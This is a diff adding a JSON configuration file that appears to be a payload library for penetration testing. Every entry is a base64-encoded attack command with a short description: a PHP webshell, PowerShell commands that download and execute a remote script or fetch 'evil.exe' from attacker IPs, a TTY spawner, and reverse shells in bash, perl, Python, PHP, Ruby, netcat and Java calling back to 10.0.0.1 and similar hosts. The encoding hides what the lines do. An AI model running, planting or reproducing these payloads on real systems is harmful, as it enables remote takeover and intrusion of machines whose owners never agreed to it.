@@ -1,0 +1,114 @@
+{
+    "command": {
+        "python_spawn_tty": {
+            "description": "Spawn a TTY after gaining shell",
+            "commands": [
+                "cHl0aG9uIC1jICdpbXBvcnQgcHR5OyBwdHkuc3Bhd24oIi9iaW4vc2giKScKcHl0aG9uMyAtYyAnaW1wb3J0IHB0eTtwdHkuc3Bhd24oIi9iaW4vc2giKSc="
+            ]
+        },
+        "php_injection_simple": {
+            "description": "Simple code for PHP injection",
+            "commands": [
+                "PD9waHAKJG91dHB1dCA9IHNoZWxsX2V4ZWMoJ2xzIC1sYXJ0Jyk7CmVjaG8gIjxwcmU+JG91dHB1dDwvcHJlPiI7Cj8+"
+            ]
+        },
+        "php_simple_webshell": {
+            "description": "Simple PHP webshell",
+            "commands": [
+                "PD9waHAgZWNobyBzaGVsbF9leGVjKCRfR0VUWydjbWQnXSk7ID8+"
+            ]
+        },
+        "ps_get_file": {
+            "description": "Get a file from a web server using PowerShell",
+            "commands": [
+                "cG93ZXJzaGVsbC5leGUgSUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuZG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly8xMC4xMC4xNi42NS9JbnZva2UtUG93ZXJTaGVsbFRjcC5wczEnKQ=="
+            ]
+        },
+        "ps_dl_exec": {
+            "description": "Download and execute a PS file from a web server using PowerShell",
+            "commands": [
+                "cG93ZXJzaGVsbC5leGUgSUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuZG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly8xMC4xMC4xNi42NS9JbnZva2UtUG93ZXJTaGVsbFRjcC5wczEnKQ=="
+            ]
+        },
+        "ps_dl_exec_url_encoding": {
+            "description": "Download and execute with some URL encoding",
+            "commands": [
+                "cG93ZXJzaGVsbC5leGUrSUVYKE5ldy1PYmplY3QrTmV0LldlYkNsaWVudCkuZG93bmxvYWRTdHJpbmcoJ2h0dHAlM2EvLzEwLjEwLjE2LjY1L0ludm9rZS1Qb3dlclNoZWxsVGNwLnBzMScp"
+            ]
+        },
+        "ps_dl_save": {
+            "description": "Download and save a file to disk PowerShell",
+            "commands": [
+                "KE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkRmlsZSgiaHR0cHM6Ly9leGFtcGxlLmNvbS9hcmNoaXZlLnppcCIsICJDOlxXaW5kb3dzXFRlbXBcYXJjaGl2ZS56aXAiKQ=="
+            ]
+        },
+        "ps_dl_save_v4_v5": {
+            "description": "Just download a file in PS versions 4.0/5.0",
+            "commands": [
+                "SW52b2tlLVdlYlJlcXVlc3QgImh0dHBzOi8vZXhhbXBsZS5jb20vYXJjaGl2ZS56aXAiIC1PdXRGaWxlICJDOlxXaW5kb3dzXFRlbXBcYXJjaGl2ZS56aXAi"
+            ]
+        },
+        "ps_dl_from_cmd_exe": {
+            "description": "Download file, but execute from cmd.exe directly",
+            "commands": [
+                "cG93ZXJzaGVsbCAtYyAiKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkRmlsZSgnaHR0cDovLzEwLjEwLjE0LjIxL2V2aWwuZXhlJywgJ0M6XFVzZXJzXHNlY3VyaXR5XERlc2t0b3BcZXZpbC5leGUnKSI="
+            ]
+        },
+        "bash_reverse": {
+            "description": "Reverse shell in bash",
+            "commands": [
+                "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS84MDgwIDA+JjEK"
+            ]
+        },
+        "perl_reverse": {
+            "description": "Reverse shell in perl",
+            "commands": [
+                "cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTEyMzQ7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307Jw=="
+            ]
+        },
+        "python_reverse": {
+            "description": "Reverse shell in Python",
+            "commands": [
+                "cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMC4wLjEiLDEyMzQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOyc="
+            ]
+        },
+        "python_reverse_udp": {
+            "description": "Reverse shell in Python over UDP",
+            "commands": [
+                "cHl0aG9uIC1jICdpbXBvcnQgb3M7IGltcG9ydCBwdHk7IGltcG9ydCBzb2NrZXQ7IHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19ER1JBTSk7IHMuY29ubmVjdCgoIjEwLjEwLjE0LjQ1IiwgOTAwMCkpOyBvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpOyBvcy5wdXRlbnYoIkhJU1RGSUxFIiwiL2Rldi9udWxsIik7IHB0eS5zcGF3bigiL2Jpbi9iYXNoIik7IHMuY2xvc2UoKTsn"
+            ]
+        },
+        "python_reverse_udp_subprocess": {
+            "description": "Python reverse shell over UDP using subprocess",
+            "commands": [
+                "aW1wb3J0IHN1YnByb2Nlc3M7IHN1YnByb2Nlc3MuUG9wZW4oWyJweXRob24iLCItYyIsJ2ltcG9ydCBvczsgaW1wb3J0IHB0eTsgaW1wb3J0IHNvY2tldDsgcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX0RHUkFNKTsgcy5jb25uZWN0KCgiMTAuMTAuMTQuNDUiLCA5MDAwKSk7IG9zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7IG9zLnB1dGVudigiSElTVEZJTEUiLCIvZGV2L251bGwiKTsgcHR5LnNwYXduKCIvYmluL2Jhc2giKTsgcy5jbG9zZSgpOyddKQ=="
+            ]
+        },
+        "php_reverse": {
+            "description": "PHP Reverse Shell",
+            "commands": [
+                "cGhwIC1yICckc29jaz1mc29ja29wZW4oIjEwLjAuMC4xIiwxMjM0KTtleGVjKCIvYmluL3NoIC1pIDwmMyA+JjMgMj4mMyIpOyc="
+            ]
+        },
+        "ruby_reverse": {
+            "description": "Reverse shell in Ruby",
+            "commands": [
+                "cnVieSAtcnNvY2tldCAtZSdmPVRDUFNvY2tldC5vcGVuKCIxMC4wLjAuMSIsMTIzNCkudG9faTtleGVjIHNwcmludGYoIi9iaW4vc2ggLWkgPCYlZCA+JiVkIDI+JiVkIixmLGYsZikn"
+            ]
+        },
+        "netcat_reverse": {
+            "description": "Reverse netcat shell",
+            "commands": [
+                "bmMgLWUgL2Jpbi9zaCAxMC4wLjAuMSAxMjM0"
+            ]
+        },
+        "java_reverse": {
+            "description": "Reverse shell in Java",
+            "commands": [
+                "ciA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpCnAgPSByLmV4ZWMoWyIvYmluL2Jhc2giLCItYyIsImV4ZWMgNTw+L2Rldi90Y3AvMTAuMC4wLjEvMjAwMjtjYXQgPCY1IHwgd2hpbGUgcmVhZCBsaW5lOyBkbyBcJGxpbmUgMj4mNSA+JjU7IGRvbmUiXSBhcyBTdHJpbmdbXSkKcC53YWl0Rm9yKCk="
+            ]
+        }
+    },
+    "configuration": {
+    }
+}
